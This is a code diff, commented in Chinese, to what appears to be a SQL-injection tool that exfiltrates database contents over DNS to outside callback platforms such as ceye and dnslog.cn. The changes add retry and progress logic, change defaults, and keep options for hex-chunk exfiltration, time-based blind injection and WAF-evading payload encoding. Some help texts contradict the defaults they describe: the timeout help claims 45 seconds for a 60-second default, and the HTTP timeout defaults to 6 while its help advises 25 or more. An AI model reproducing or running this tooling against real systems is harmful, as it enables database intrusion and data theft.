@@ -423,6 +423,8 @@ class DnsExfil:
     def wait_for(self, marker, deadline=None):
         """等一条以 marker 开头的记录，返回整条记录名。"""
         deadline = deadline or (time.time() + self.timeout)
+        started = time.time()
+        last_note = 0.0
         while time.time() < deadline:
             try:
                 names = self._names()
@@ -434,13 +436,24 @@ class DnsExfil:
                 if n.startswith(marker):
                     return n
             time.sleep(self.poll)
+            waited = time.time() - started
+            if waited - last_note >= 5:
+                last_note = waited
+                print("     等待 %s 的记录… %ds/%ds"
+                      % (marker, int(waited), int(self.timeout)), file=sys.stderr)
         return None
 
     # ---- hex 整块外带 ----
     def hex_chunk(self, expr, off, ln):
         marker = "%s.h%06d" % (self.nonce, off)
-        self.fire(self.db.hex_sql(marker, expr, off, ln), marker)
+        sql = self.db.hex_sql(marker, expr, off, ln)
+        self.fire(sql, marker)
         rec = self.wait_for(marker)
+        if rec is None:
+            # ceye 入库可能延迟到 30~60 秒, 重投一次比直接判失败划算
+            print("[!] %s 未入库, 重投一次" % marker, file=sys.stderr)
+            self.fire(sql, marker)
+            rec = self.wait_for(marker)
         if rec is None:
             return None
         # marker.<hex>.<domain>  -> 取 marker 与 domain 之间那段
@@ -774,8 +787,9 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     ap.add_argument("--check-timeout", type=float, default=60.0)
     ap.add_argument("--check-doh", action="store_true",
                     help="探针解析强制走 DoH(本地 DNS 被代理 fake-ip 劫持时用)")
-    ap.add_argument("--provider", default="dnslog.cn",
-                    choices=["dnslog.cn", "dnsloggo", "ceye", "cmd"])
+    ap.add_argument("--provider", default="ceye",
+                    choices=["ceye", "dnslog.cn", "dnsloggo", "cmd"],
+                    help="回调平台, 默认 ceye(需要 --token 与 --ident)")
     ap.add_argument("--base", help="DNSLog-GO 地址, 如 http://HOST:8000")
     ap.add_argument("--token", help="DNSLog-GO / ceye token")
     ap.add_argument("--filter", help="ceye 记录过滤子串(默认自动用 nonce), 也可用来只看某个任务")
@@ -792,8 +806,9 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     ap.add_argument("--blind", action="store_true", help="布尔通道(不回带 hex, 每字符约 7 次请求)")
     ap.add_argument("--chunk", type=int, default=30, help="每块字节数, hex 后 <=60 字符")
     ap.add_argument("--max-bytes", type=int, default=8192)
-    ap.add_argument("--poll", type=float, default=2.0)
-    ap.add_argument("--timeout", type=float, default=90.0)
+    ap.add_argument("--poll", type=float, default=2.0, help="轮询平台的间隔(秒)")
+    ap.add_argument("--timeout", type=float, default=60.0,
+                    help="单块等待平台记录的上限(秒), 默认 45")
     ap.add_argument("--nonce", help="固定标记, 便于过滤平台记录")
     ap.add_argument("--technique", default="dns", choices=["dns", "time"],
                     help="dns=Hex 带外(默认, 最快); time=SLEEP 时间盲注(无带外也能跑, 慢)")
@@ -803,7 +818,7 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     ap.add_argument("--suffix", default="", help="payload 后缀, 例如 '-- -'")
     ap.add_argument("--encode", default="auto", choices=["auto", "strict"],
                     help="payload URL 编码方式: auto=保留 ()/\"' 等字符(绕 WAF, 默认), strict=全量编码")
-    ap.add_argument("--http-timeout", type=float, default=30.0,
+    ap.add_argument("--http-timeout", type=float, default=6.0,
                     help="单次 HTTP 请求超时; UNC 触发 SMB 时会挂住, 建议 >=25")
     ap.add_argument("-v", "--verbose", action="store_true")
     a = ap.parse_args()
@@ -837,9 +852,9 @@ ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_ID
     # 不给 ceye 自动加 filter: 带 filter 的查询会被平台缓存, 多分块 dump 时
     # 第二块起可能读到旧结果。默认拉最近记录本地匹配, 需要时用 --filter 显式指定。
 
-    print("[*] provider=%s  dbms=%s" % (a.provider, a.dbms))
-    print("[!] %s" % dbms.notes)
-    print("[*] callback: %s  nonce=%s" % (ex.domain, ex.nonce))
+    print("[*] provider=%s  dbms=%s" % (a.provider, a.dbms), flush=True)
+    print("[!] %s" % dbms.notes, flush=True)
+    print("[*] callback: %s  nonce=%s" % (ex.domain, ex.nonce), flush=True)
 
     expr = "(%s)" % a.expr
     if a.technique == "time":
